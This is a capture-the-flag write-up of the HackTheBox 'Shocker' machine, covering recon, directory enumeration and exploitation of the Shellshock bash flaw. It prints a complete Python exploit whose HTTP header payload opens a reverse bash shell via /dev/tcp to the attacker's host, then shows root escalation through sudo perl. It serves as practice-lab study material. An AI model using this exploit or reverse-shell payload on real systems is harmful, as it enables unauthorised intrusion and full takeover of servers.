---
title: "HackTheBox Shocker Walkthrough - Shellshock Vulnerability Exploitation"
description: "Complete walkthrough of HackTheBox Shocker machine. Learn Shellshock (CVE-2014-6271) vulnerability exploitation and Linux penetration testing."
keywords: ["hackthebox shocker", "shellshock", "cve-2014-6271", "bash vulnerability", "linux exploitation", "web application security"]
tags: ["hackthebox", "shellshock", "vulnerability", "linux", "web-exploitation"]
sidebar_position: 3
---

:::info Description

These are my notes for the Shocker (Retired) Box on [HackTheBox](https://hackthebox.com).

|OS|Level|Rating
|:---:|:-----:|:-----:|
|Linux|Easy|3/5|

:::

## KEY LEARNINGS

:::tip

1. rinse all the wordlists for directory enumeration you can, enumerate thoroughly as the ONE small find may be the key to it all.
2. I need a good directory enumeration playbook to work from e.g. know more switches like extension filtering

:::

## RECON

### NMAP

run it all: `sudo nmap -v 10.10.10.56 -Pn -p- -sC -sV -O --min-rate=5000 -o nmap-shocker.txt`

```bash
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

find vulns for

* `Apache httpd 2.4.18`
* `OpenSSH 7.2p2`

```bash
723 💀 ± ➤ searchsploit apache 2.4.18                                                              [tun0: 10.10.16.2]
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                     | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                   | php/remote/29316.py
Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalati | linux/local/46676.php
Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak                                    | linux/webapps/42745.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                                 | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)          | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)          | unix/remote/47080.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal                 | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                                   | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                                 | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                           | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass /  | jsp/webapps/42966.py
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass /  | windows/webapps/42953.txt
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                        | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution    | linux/remote/34.pl
```

check exploits for ssh

```bash
725 💀 ± ➤ searchsploit openssh 7.2p2                                                              [tun0: 10.10.16.2]
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                            | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                      | linux/remote/45210.py
OpenSSH 7.2p2 - Username Enumeration                                                | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Pri | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                            | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                               | linux/remote/40113.txt
```

tried the `40136.py` exploit, just enumerates usernames... wasn't sure what to do even if I did verify a valid username...

:::danger did not try harder

Looked up this [walk-through](https://medium.com/@bl1nd/shocker-writeup-no-metasploit-c0a450b0295d) cos I'm tired af and cbf seeing this box through.

:::

The walk-through did several

* gobuster enumerations with different word lists (SecLists usually)
* did the OpenSSH 7.2p2 enumeration exploit, didn't really find much `root` and `toor`
* used hydra to try and bruteforce the ssh login - no luck
* came back to enumerate dir again with gobuster

## EXPLOIT

The box is called "shocker" so looked up "[Shellshock bug](https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf)", and its a bash shell vuln.

Bash shell aka *.sh

First gobuster run had these results:

```bash
http://10.10.10.56/.                    (Status: 200) [Size: 137]
http://10.10.10.56/.htaccess            (Status: 403) [Size: 295]
http://10.10.10.56/.htaccess-dev        (Status: 403) [Size: 299]
http://10.10.10.56/.htaccess-marco      (Status: 403) [Size: 301]
http://10.10.10.56/.htaccess-local      (Status: 403) [Size: 301]
http://10.10.10.56/.htaccess.bak1       (Status: 403) [Size: 300]
http://10.10.10.56/.htaccess.inc        (Status: 403) [Size: 299]
http://10.10.10.56/.htaccess.old        (Status: 403) [Size: 299]
http://10.10.10.56/.htaccess.bak        (Status: 403) [Size: 299]
http://10.10.10.56/.htaccess.orig       (Status: 403) [Size: 300]
http://10.10.10.56/.htaccess.sample     (Status: 403) [Size: 302]
http://10.10.10.56/.htaccess.txt        (Status: 403) [Size: 299]
http://10.10.10.56/.htaccess.save       (Status: 403) [Size: 300]
http://10.10.10.56/.htm                 (Status: 403) [Size: 290]
http://10.10.10.56/.htaccessOLD2        (Status: 403) [Size: 299]
http://10.10.10.56/.htaccessOLD         (Status: 403) [Size: 298]
http://10.10.10.56/.htaccessBAK         (Status: 403) [Size: 298]
http://10.10.10.56/.htaccess/           (Status: 403) [Size: 296]
http://10.10.10.56/.html                (Status: 403) [Size: 291]
http://10.10.10.56/.htpasswd-old        (Status: 403) [Size: 299]
http://10.10.10.56/.htpasswd.bak        (Status: 403) [Size: 299]
http://10.10.10.56/.httr-oauth          (Status: 403) [Size: 297]
http://10.10.10.56/.htpasswd.inc        (Status: 403) [Size: 299]
http://10.10.10.56/.htpasswd/           (Status: 403) [Size: 296]
http://10.10.10.56//                    (Status: 200) [Size: 137]
http://10.10.10.56/cgi-bin/             (Status: 403) [Size: 294]
http://10.10.10.56/icons/               (Status: 403) [Size: 292]
http://10.10.10.56/index.html           (Status: 200) [Size: 137]
```

the walkthrough, saw `http://10.10.10.56/cgi-bin/ (Status: 403) [Size: 294]` and theorised that a "bash shell" bug would be in the `/cgi-bin/` space (which makes sense).

Another gobuster run, with `-x` for extensions, and target the `/cgi-bin/` folder:

`gobuster dir -x cgi,php,sh,log, -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt`

from the walkthroughm, I know a) `http://10.10.10.56/cgi-bin/user.sh` exists.

```bash
RxHackk 福 ~/Repos/RxHack/HTB/BOXES/SHOCKER ➤ 431f6ec|main⚡
792 💀 ± ➤ gobuster dir -x cgi,php,sh,log, -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              cgi,php,sh,log,
[+] Timeout:                 10s
===============================================================
2022/04/09 23:58:55 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 298]
/.htpasswd.log        (Status: 403) [Size: 307]
/.htaccess.cgi        (Status: 403) [Size: 307]
/.htpasswd.           (Status: 403) [Size: 304]
/.hta.cgi             (Status: 403) [Size: 302]
/.htaccess.php        (Status: 403) [Size: 307]
/.htpasswd            (Status: 403) [Size: 303]
/.hta.php             (Status: 403) [Size: 302]
/.htaccess.sh         (Status: 403) [Size: 306]
/.hta.sh              (Status: 403) [Size: 301]
/.htpasswd.cgi        (Status: 403) [Size: 307]
/.htaccess.log        (Status: 403) [Size: 307]
/.hta.log             (Status: 403) [Size: 302]
/.htpasswd.php        (Status: 403) [Size: 307]
/.htaccess.           (Status: 403) [Size: 304]
/.hta.                (Status: 403) [Size: 299]
/.htaccess            (Status: 403) [Size: 303]
/.htpasswd.sh         (Status: 403) [Size: 306]
/user.sh              (Status: 200) [Size: 118] <----------found it!

===============================================================
2022/04/10 00:21:35 Finished
===============================================================
```

---------working on it myself from this point----------

looked up "shellshock" found [nmap shellshock scripts](https://nmap.org/nsedoc/scripts/http-shellshock.html)

confirms it:

```bash
807 💀 ± ➤ nmap -sV -p 80,2222 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.56
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-10 00:19 NZST
Nmap scan report for 10.10.10.56
Host is up (0.28s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-shellshock:
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|
|     Disclosure date: 2014-09-24
|     References:
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       http://seclists.org/oss-sec/2014/q3/685
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### shellshock bug

found this: [https://pastebin.com/raw/166f8Rjx](https://pastebin.com/raw/166f8Rjx)

added the hash-bang

```python
#!/usr/bin/env python2

#
#CVE-2014-6271 cgi-bin reverse shell
#

import httplib,urllib,sys

if (len(sys.argv)<4):
  print "Usage: %s <host /> <vulnerable CGI /> <attackhost/IP />" % sys.argv[0]
  print "Example: %s localhost /cgi-bin/test.cgi 10.0.0.1/8080" % sys.argv[0]
  exit(0)

conn = httplib.HTTPConnection(sys.argv[1])
reverse_shell="() { ignored;};/bin/bash -i >& /dev/tcp/%s 0>&1" % sys.argv[3]

headers = {"Content-type": "application/x-www-form-urlencoded",
  "test":reverse_shell }
conn.request("GET",sys.argv[2],headers=headers)
res = conn.getresponse()
print res.status, res.reason
data = res.read()
print data
```

execute with listener open:

```bash
RxHackk 福 ~/Repos/RxHack/HTB/BOXES/SHOCKER/foothold ➤ 431f6ec|main⚡
819 💀 ± ➤ ./shocker.py 10.10.10.56 /cgi-bin/user.sh 10.10.16.2/443

──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

RxHackk 福 ~/Repos/RxHack/HTB/BOXES/SHOCKER ➤ 431f6ec|main⚡
817 💀 ± ➤ sudo rlwrap nc -lvrp 443
listening on [any] 443 ...
10.10.10.56: inverse host lookup failed: Unknown host
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.56] 33484
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$
```

### user.txt

```bash
shelly@Shocker:/home/shelly$ ls
user.txt
cat user.txt
cat user.txt
2ec24e11320026d1e70ff3e16695b233
shelly@Shocker:/home/shelly$
```

## PRIVESC

```bash
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
shelly@Shocker:/home/shelly$
```

### root.txt

perl shell ftw

```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
id
uid=0(root) gid=0(root) groups=0(root)
ls /root
root.txt
cat /root/root.txt
52c2715605d70c7619030560dc1ca467
```
